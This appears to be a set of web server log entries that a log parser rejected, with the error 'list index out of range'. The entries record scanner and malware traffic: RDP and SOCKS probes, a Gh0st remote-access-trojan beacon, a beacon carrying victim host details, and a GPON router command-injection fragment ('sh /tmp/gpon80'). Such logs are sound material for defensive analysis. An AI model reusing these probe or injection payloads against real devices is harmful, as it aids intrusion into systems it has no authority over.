7402@@66.240.205.34 - - [03/Apr/2021:22:35:56 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
7678@@172.104.131.24 - - [20/Nov/2021:05:36:39 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 166 "-" "-"@@list index out of range
7680@@157.230.143.29 - - [20/Nov/2021:05:39:16 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
7683@@45.137.21.9 - - [20/Nov/2021:06:19:21 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03C\xC1cH\xF8\xC6\xF3\x01\x92\xAF3\xD7\x8A\xC0\x0F:}^\xBC_[\x1FOw\x18\x13~w\xA4h!\x91 q\x1B\xBF\x83\xA8\x5C\xE3F'5B\xD8" 400 166 "-" "-"@@list index out of range
7790@@45.137.21.9 - - [20/Nov/2021:11:47:58 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xBE\x0ER\xC3(@\xFE\xAD\x8C\x89\xD0\x84\x16\xCC\xB2B\xBF\xB9\x84\xBB\xEE\xD6;P\xEA\x14X\xF2\x8A\xEB\xFDn \xCF72\xB7\xBBqh\xC9z4^\xE3\xA2\x9B\x95\xD5\xF4\x95\xC6\x1F\x04\x1C\xEC\xF3KF\xF6?\xACjv\xA3\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"@@list index out of range
7831@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
7832@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
7833@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
7838@@80.82.77.139 - - [20/Nov/2021:12:57:15 +0000] "\x03\xAA\xF0\x98a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
7878@@66.240.205.34 - - [20/Nov/2021:15:09:06 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
7992@@193.32.164.16 - - [20/Nov/2021:20:18:53 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
8038@@52.55.215.86 - - [20/Nov/2021:22:07:59 +0000] "" 400 0 "-" "-"@@list index out of range
8040@@94.232.43.63 - - [20/Nov/2021:22:15:01 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8041@@94.232.43.63 - - [20/Nov/2021:22:15:01 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8139@@5.188.210.227 - - [19/Nov/2021:01:47:39 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
8140@@5.188.210.227 - - [19/Nov/2021:01:48:50 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
8229@@5.188.210.227 - - [19/Nov/2021:06:44:07 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
8230@@5.188.210.227 - - [19/Nov/2021:06:45:25 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
8234@@34.77.162.12 - - [19/Nov/2021:07:06:27 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03g\x1D\xC8(\xBD\xEA1\xD1:\xEF~d\x7F\x84\x0F\x9A2[\xC6\xCC\xC4d\x1A-\x96\xA1\x0EcQ\x114u\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
8301@@142.93.148.236 - - [19/Nov/2021:08:44:18 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03\xAE_B-B\xB8h\xBAo)\x13ekvs?\xDFY\x88\xA3\xBB\xB8X\xDA\xCCl\xA6)!\xF9" 400 166 "-" "-"@@list index out of range
8690@@5.135.42.95 - - [19/Nov/2021:12:37:08 +0000] "" 400 0 "-" "-"@@list index out of range
8820@@185.254.31.134 - - [19/Nov/2021:21:43:48 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\x14O\xC1\xD0\xB6=\x8D\xD5\xEA\xB59\xE9A\x9D\x80\xC5y&\xFE\xC4" 400 166 "-" "-"@@list index out of range
8824@@181.214.206.52 - - [19/Nov/2021:21:52:22 +0000] ":\x92T\x05ib\xE8\x0Ek_V\x08\xDD=x\xAB\xC2\x13\x22\xB88\x1B\x01\x07\xA6\xB1~\xE0Ap\x8D\x96\xF3 \xB9\xDB\x0CEN#5h[\xE4\xC5\x16\xF7wBr=\xB1" 400 166 "-" "-"@@list index out of range
8885@@195.133.18.100 - - [19/Nov/2021:22:43:05 +0000] "" 400 0 "-" "-"@@list index out of range
8924@@157.230.143.29 - - [18/Nov/2021:00:47:06 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x87b\x7F\xCE$GNa\x00\x0E\xC6^\x5C\xA3DW\xD9\xD4\x1C\x13\xC1,2{\xEC\xABE?[x\x0E\xEC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
8941@@185.254.31.134 - - [18/Nov/2021:01:14:54 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\xAB\xFB*v\xD2\xCD\x8BK\xD6\xE9\xBE\xE0\xEF\x13\xD2F>\xD4\x89\xF7P\xC7\xAF\xFF\x99L\xE9:(f\x19\x97 \xD8\xDA\x98\xD0Wfe\xF7\xC2![,4\x7F\xF6j\x90\xBC\x99\xB4\x02\xC5T\x07\x84S\x5C\xEA\xCE\xF0y\xA1\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
8982@@36.255.90.219 - - [18/Nov/2021:02:25:54 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
9025@@205.185.124.100 - - [18/Nov/2021:03:29:05 +0000] "" 400 0 "-" "-"@@list index out of range
9054@@20.55.53.144 - - [18/Nov/2021:06:40:59 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03`q\x81\xFA\xFD\xFB%\xF5\xCB`\xEEu\x17E\xAD\xE5\x8A\xDF\xE3\x81\x0CH\x8E\x05\x0E*\xFF[\xE6\x9EN\xE0 \xD1\xEB\xFA\xDA\xA4\xF8\xBFVPte\xF8&\x94\x89\xD1DN\x8D\x18\xF9aR  \xC5{Yt#\xED@\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
9353@@89.248.165.52 - - [18/Nov/2021:17:32:24 +0000] "\x04\x01\x00\x19h/;\xA1\x00" 400 166 "-" "-"@@list index out of range
9354@@89.248.165.52 - - [18/Nov/2021:17:32:24 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
9357@@20.55.53.144 - - [18/Nov/2021:17:40:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xD1t4P\xF9\x9C\xAF\xD9\xB3\x1B\x14\xAFmz\x81\xA6X\xAB\x15\xAD" 400 166 "-" "-"@@list index out of range
9359@@20.55.53.144 - - [18/Nov/2021:17:52:35 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03/\xD1\xAC\xB4kT\xC1\xEE\xF6\x04\x8AL\xEE\xB9\x973w\x94Wl\xE3\x9C\xD2b\xCA\xAD\x97\x00\xD2\xF5\x19\xF2 B\x98\xD1\x8C\x03\xA6\x9EM\xD7te\x89\x19\xBA\xD45\xF8\xACXM\xAA\x89\xA9\xB3\x01\x22\xAA+\xED\xB3\x8C[\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
9368@@209.141.54.186 - - [18/Nov/2021:18:37:38 +0000] "" 400 0 "-" "-"@@list index out of range
9392@@89.248.165.52 - - [18/Nov/2021:21:11:00 +0000] "\x04\x01\x00PU\xCE\xA0s\x00" 400 166 "-" "-"@@list index out of range
9393@@89.248.165.52 - - [18/Nov/2021:21:11:00 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
9472@@2021/11/27 03:37:21 [crit] 60954#60954: *197960 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 184.105.247.194, server: 0.0.0.0:443@@list index out of range
9473@@2021/11/26 03:36:36 [crit] 60954#60954: *197032 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 184.105.139.69, server: 0.0.0.0:443@@list index out of range
9474@@2021/11/26 04:30:37 [crit] 60954#60954: *197064 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 185.220.100.255, server: 0.0.0.0:443@@list index out of range
9475@@2021/11/26 05:32:35 [crit] 60954#60954: *197121 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 183.136.225.9, server: 0.0.0.0:443@@list index out of range
9476@@2021/11/26 18:46:42 [crit] 60954#60954: *197688 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 178.73.215.171, server: 0.0.0.0:443@@list index out of range
9477@@2021/11/26 20:36:56 [crit] 60954#60954: *197758 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 71.6.158.166, server: 0.0.0.0:443@@list index out of range
9478@@2021/11/26 21:43:17 [crit] 60954#60954: *197803 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 161.35.188.242, server: 0.0.0.0:443@@list index out of range
9479@@2021/11/26 23:41:25 [crit] 60954#60954: *197864 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 192.241.213.250, server: 0.0.0.0:443@@list index out of range
